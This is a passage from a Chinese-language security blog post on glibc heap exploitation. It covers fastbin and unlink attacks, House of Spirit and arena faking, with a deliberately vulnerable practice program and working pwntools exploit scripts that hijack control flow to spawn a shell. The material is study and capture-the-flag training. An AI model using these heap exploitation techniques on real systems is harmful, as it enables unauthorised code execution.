class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    	gdb.attach(io,a)</span><br><span class="line">    	<span class="keyword">if</span> a == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        	raw_input()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gets</span>(<span class="params">index,sz,buff</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;1 &quot;</span>+<span class="built_in">str</span>(index)+<span class="string">&quot; &quot;</span>+<span class="built_in">str</span>(sz)+<span class="string">&quot; &quot;</span>+buff)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;2 &quot;</span>+<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">puts</span>(<span class="params">index</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;3 &quot;</span>+<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gets(<span class="number">0</span>,<span class="number">56</span>,<span class="string">&quot;AAAA&quot;</span>)</span><br><span class="line">gets(<span class="number">1</span>,<span class="number">56</span>,<span class="string">&quot;BBBB&quot;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">puts_got=<span class="number">0x601020</span></span><br><span class="line">system_addr=<span class="number">0x4007F6</span></span><br><span class="line"></span><br><span class="line">gets(<span class="number">2</span>,<span class="number">56</span>,<span class="string">&quot;A&quot;</span>*<span class="number">56</span>+p64(<span class="number">0x41</span>)+p64(puts_got))</span><br><span class="line">gets(<span class="number">3</span>,<span class="number">56</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"><span class="comment">#gets(4,56,patch+system_addr)</span></span><br><span class="line"><span class="comment">#puts(3)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#z()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="Free-Arbitrary-Address-House-of-Spirit"><a href="#Free-Arbitrary-Address-House-of-Spirit" class="headerlink" title="Free Arbitrary Address(House of Spirit)"></a>Free Arbitrary Address(House of Spirit)</h3><ul>
<li>其他overflow可以改掉一个原本由malloc得到的指针p，free(p)时会被改掉的指针进入fastbin，下次malloc是就可以拿到</li>
</ul>
<h2 id="Unlink-Exploitation"><a href="#Unlink-Exploitation" class="headerlink" title="Unlink Exploitation"></a>Unlink Exploitation</h2><h3 id="合并-freed-chunks"><a href="#合并-freed-chunks" class="headerlink" title="合并 freed chunks"></a>合并 freed chunks</h3><ul>
<li>非fastbin chunk在free掉时，会跟前后的freed chunk合并</li>
</ul>
<h3 id="unlink-Macro"><a href="#unlink-Macro" class="headerlink" title="unlink() Macro"></a>unlink() Macro</h3><ul>
<li>unlink()是用来把chunk移出bin用的，从double linked list移除</li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(P,BK,FD&#123;       \</span></span><br><span class="line"><span class="meta">  FD=P-&gt;fd;                   \</span></span><br><span class="line"><span class="meta">  BK=P-&gt;BK;                   \</span></span><br><span class="line"><span class="meta">  FD-&gt;bk=BK;                  \</span></span><br><span class="line"><span class="meta">  BK-&gt;fd=FD;                  \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><ul>
<li>如果有overflow可以覆盖到某个chunk q的pre size,free q时可以控制unlink(p)的p</li>
<li>使得o的内容也可控</li>
<li>利用unlink机制造成dword shoot：<ul>
<li>FD&#x3D;p-&gt;fd&#x3D;<a href="mailto:&#102;&#x72;&#101;&#x65;&#x40;&#x67;&#111;&#116;&#x2e;&#112;&#x6c;&#x74;&#45;&#x30;&#x78;&#x31;&#56;">&#102;&#x72;&#101;&#x65;&#x40;&#x67;&#111;&#116;&#x2e;&#112;&#x6c;&#x74;&#45;&#x30;&#x78;&#x31;&#56;</a></li>
<li>BK&#x3D;p-&gt;bk&#x3D;shellcode</li>
</ul>
</li>
</ul>
<p>现在已经不可用，现在会进行检查：</p>
<ul>
<li>实际的unlink会检查double linked list是不是合法的<ul>
<li>p-&gt;fd-&gt;bk&#x3D;&#x3D;p</li>
</ul>
</li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(P,BK,FD&#123;                          \</span></span><br><span class="line"><span class="meta">  FD=P-&gt;fd;                                      \</span></span><br><span class="line"><span class="meta">  BK=P-&gt;BK;                                      \</span></span><br><span class="line"><span class="meta">  <span class="keyword">if</span>(FD-&gt;bk!=P||BK-&gt;fd!=P)                       \</span></span><br><span class="line"><span class="meta">    malloc_printrtr(check_action,<span class="string">&quot;corrupted&quot;</span>,P); \</span></span><br><span class="line"><span class="meta">  <span class="keyword">else</span>&#123;                                          \</span></span><br><span class="line"><span class="meta">    FD-&gt;bk=BK;                                   \</span></span><br><span class="line"><span class="meta">    BK-&gt;fd=FD;                                   \</span></span><br><span class="line"><span class="meta">  &#125;                                              \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="Overwrite-Heap-Pointer"><a href="#Overwrite-Heap-Pointer" class="headerlink" title="Overwrite Heap Pointer"></a>Overwrite Heap Pointer</h3><ul>
<li>unlink检查绕过，需要以下一些条件<ul>
<li>一个指向heap内的指针</li>
<li>存放该指针的地址已知</li>
<li>可以对该指针写入多次</li>
</ul>
</li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;fd=&amp;p<span class="number">-0x18</span>;</span><br><span class="line">p-&gt;bk=&amp;p<span class="number">-0x10</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>Result:p&#x3D;&amp;p-0x18</li>
</ul>
<h2 id="mmap-chunks"><a href="#mmap-chunks" class="headerlink" title="mmap chunks"></a>mmap chunks</h2><ul>
<li>malloc size超过约0x21000时，会改用mmap直接请求内存</li>
<li>mmap得到的地址是连续的，得到的chunk会接在上一次mmap之前，通常最后一次mmap会是tls段</li>
</ul>
<h3 id="伪造arena"><a href="#伪造arena" class="headerlink" title="伪造arena"></a>伪造arena</h3><ul>
<li>平常使用的arena是在libc内部的main_arena参数</li>
<li>malloc时会根据tls段上的某些指标决定使用的arena</li>
<li>mmap chunk overflow时可以盖掉arena指标<ul>
<li>tls段上有stack address，stack guard canary</li>
</ul>
</li>
<li>伪造的arena的fastbin部分，使得下次malloc时可以取得伪造的chunk</li>
<li>这个利用方式需要任意大小的malloc，但是不需要free</li>
</ul>
<p>练习题：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> cmd[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sh</span><span class="params">(<span class="type">char</span> *c)</span></span>&#123;</span><br><span class="line">	<span class="built_in">system</span>(c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">char</span>* ptr[<span class="number">8</span>];</span><br><span class="line">	<span class="type">char</span> magic[<span class="number">32</span>];</span><br><span class="line">	<span class="type">int</span> size,n;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">setvbuf</span>(stdout,<span class="number">0</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">	<span class="built_in">memset</span>(ptr,<span class="number">0</span>,<span class="built_in">sizeof</span>(ptr));</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">gets</span>(magic);	</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="built_in">fgets</span>(cmd,<span class="number">1024</span>,stdin);</span><br><span class="line">		<span class="keyword">if</span>(!<span class="built_in">strncmp</span>(cmd,<span class="string">&quot;add&quot;</span>,<span class="number">3</span>))&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">			<span class="keyword">if</span>(n&gt;=<span class="number">0</span>&amp;&amp;n&lt;<span class="number">8</span>)&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);		</span><br><span class="line">				<span class="built_in">scanf</span>(<span class="string">&quot;%d%*c&quot;</span>,&amp;size);</span><br><span class="line">				ptr[n]=<span class="built_in">malloc</span>(size);</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;Data: &quot;</span>);</span><br><span class="line">				<span class="built_in">gets</span>(ptr[n]);			</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="built_in">puts</span>(<span class="string">&quot;out of bound&quot;</span>);								</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;<span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(cmd,<span class="string">&quot;print&quot;</span>,<span class="number">5</span>))&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">				<span class="built_in">scanf</span>(<span class="string">&quot;%d%*c&quot;</span>,&amp;n);</span><br><span class="line">				<span class="keyword">if</span>(n&gt;=<span class="number">0</span>&amp;&amp;n&lt;<span class="number">8</span>&amp;&amp;ptr[n])&#123;</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">					<span class="built_in">scanf</span>(<span class="string">&quot;%d%*c&quot;</span>,&amp;size);</span><br><span class="line">					<span class="built_in">write</span>(<span class="number">1</span>,ptr[n],size);			</span><br><span class="line">				&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">					<span class="built_in">puts</span>(<span class="string">&quot;nothing here&quot;</span>);				</span><br><span class="line">				&#125;										</span><br><span class="line">		&#125;<span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(cmd,<span class="string">&quot;exit&quot;</span>,<span class="number">4</span>))&#123;</span><br><span class="line">			<span class="keyword">break</span>;	</span><br><span class="line">		&#125;		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&quot;debug&quot;</span></span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">binary_name = <span class="string">&#x27;arena&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	io = process(<span class="string">&#x27;./&#x27;</span>+binary_name)</span><br><span class="line">    	<span class="comment">#libc = ELF(&#x27;./libc.so.6&#x27;,checksec=False)</span></span><br><span class="line">    	<span class="comment">#libc = ELF(&#x27;/lib/i386-linux-gnu/libc-2.23.so&#x27;,checksec=False)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    	io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">4000</span>)</span><br><span class="line">    	<span class="comment">#libc = ELF(&#x27;./libc.so.6&#x27;,checksec=False)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">bin</span> = ELF(<span class="string">&#x27;./&#x27;</span>+binary_name,checksec=<span class="literal">False</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">z</span>(<span class="params">a=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">  gdb.attach(io,a)</span><br><span class="line">  <span class="keyword">if</span> a == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,data</span>):</span><br><span class="line">	io.sendline(<span class="string">&quot;add&quot;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	io.sendlineafter(<span class="string">&quot;Data: &quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">prt</span>(<span class="params">index,sz</span>):</span><br><span class="line">	io.sendline(<span class="string">&quot;print&quot;</span>)</span><br><span class="line">	io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">	io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(sz))</span><br><span class="line">	<span class="keyword">return</span> io.recvn(sz)</span><br><span class="line"></span><br><span class="line"><span class="comment">#fake fast bin chunk</span></span><br><span class="line">io.sendline(<span class="string">&quot;AAAABBBB&quot;</span>+p64(<span class="number">0x20</span>+<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">cmd = <span class="number">0x6010c0</span> </span><br><span class="line">sh=<span class="number">0x4008F6</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x21000</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">k=prt(<span class="number">0</span>,<span class="number">0x23a00</span>)</span><br><span class="line"><span class="comment">#print k</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">for i in range(0,len(k),8):</span></span><br><span class="line"><span class="string">	x=u64(k[i:i+8])</span></span><br><span class="line"><span class="string">	if x!=0:</span></span><br><span class="line"><span class="string">		print hex(i),hex(x)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">stack=u64(k[<span class="number">0x239f0</span>:<span class="number">0x239f0</span>+<span class="number">8</span>])</span><br><span class="line">stack_guard=u64(k[<span class="number">0x23718</span>:<span class="number">0x23718</span>+<span class="number">8</span>])</span><br><span class="line">main_arena=<span class="number">0x236b8</span></span><br><span class="line">chunk=stack-<span class="number">112</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;stack=&quot;</span>,<span class="built_in">hex</span>(stack)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;stack_guard=&quot;</span>,<span class="built_in">hex</span>(stack_guard)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;fake_chunk=&quot;</span>,<span class="built_in">hex</span>(chunk)</span><br><span class="line"><span class="comment">#add(1,0x21000,&quot;A&quot;*0x22000+k[:main_arena]+p64())</span></span><br><span class="line"></span><br><span class="line">data=<span class="string">&quot;A&quot;</span>*<span class="number">0x22000</span>+k[:main_arena]+p64(cmd+<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">&quot;add&quot;</span>.ljust(<span class="number">16</span>)+(p32(<span class="number">0</span>)+p32(<span class="number">1</span>))+p64(chunk)+<span class="string">&quot;sh\x00&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(<span class="number">0x21000</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Data: &quot;</span>,data)</span><br><span class="line"><span class="comment">#z()</span></span><br><span class="line"></span><br><span class="line">rop=flat(</span><br><span class="line"><span class="number">0x0000000000400be3</span>,</span><br><span class="line"><span class="number">0x6010e0</span>,</span><br><span class="line">sh</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">10</span>,<span class="string">&quot;A&quot;</span>*<span class="number">24</span>+p64(stack_guard)+<span class="string">&quot;B&quot;</span>*<span class="number">24</span>+rop)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/avater.png" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/avater.png" title="头像" alt="头像"></a><div class="post-copyright__author_name">Ivoripuion</div><div class="post-copyright__author_desc">开心就好</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://example.com/2023/10/16/glibcHeapExp/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://example.com/2023/10/16/glibcHeapExp/')">Glibc Heap Exp</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://example.com/2023/10/16/glibcHeapExp/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=undefined&amp;url=http://example.com/2023/10/16/glibcHeapExp/&amp;pic=undefined" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="rm.copyPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">米惜</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>漏洞分析<span class="tagsPageCount">22</span></a><a class="post-meta__box__tags" href="/tags/pwn/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>pwn<span class="tagsPageCount">1</span></a><a class="post-meta__box__tags" href="/tags/Linux/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>Linux<span class="tagsPageCount">5</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="/cover/%E4%BA%91%E5%AE%89%E5%85%A8.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/10/16/Fuzzing%20random%20programs%20without%20execve%E8%AF%91%E6%96%87/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/cover/afl.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Fuzzing random programs without execve() 译文</div></div></a></div><div class="next-post pull-right"><a href="/2023/10/16/lab6/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/cover/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">恶意代码分析实战 Lab6</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2023/10/16/noinfowp/" title="noinfoleak"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/default_cover.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-10-16</div><div class="title">noinfoleak</div></div></a></div><div><a href="/2023/10/16/CVE-2010-2883/" title="CVE-2010-2883分析"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/cover/CVE.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-10-16</div><div class="title">CVE-2010-2883分析</div></div></a></div><div><a href="/2023/10/16/CVE-2020-0601%E5%88%86%E6%9E%90/" title="CVE-20200601分析"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/cover/CVE.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-10-16</div><div class="title">CVE-20200601分析</div></div></a></div><div><a href="/2023/10/16/CVE-2017-11882%E5%88%86%E6%9E%90/" title="CVE-2017-11882分析"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/cover/CVE.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-10-16</div><div class="title">CVE-2017-11882分析</div></div></a></div><div><a href="/2023/10/16/0day-25/" title="note chapter 25"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/cover/0day%E5%AE%89%E5%85%A8.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-10-16</div><div class="title">note chapter 25</div></div></a></div><div><a href="/2023/10/16/0day-15/" title="note chapter 15"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/cover/0day%E5%AE%89%E5%85%A8.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-10-16</div><div class="title">note chapter 15</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/avater.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/state.png" ait="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">对<b style="color:#fff">云安全、二进制安全、精神分析</b>相关的主题感兴趣，分享包括但不限于<b style="color:#fff">笔记</b>、<b style="color:#fff">随想</b>、<b style="color:#fff">热点分析</b>等内容。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">感谢你对本站点的访问和阅读。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/"><h1 class="author-info__name">Ivoripuion</h1><div class="author-info__desc">开心就好</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/Ivoripuion" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/13703678" target="_blank" title="BiliBili"><i class="anzhiyufont 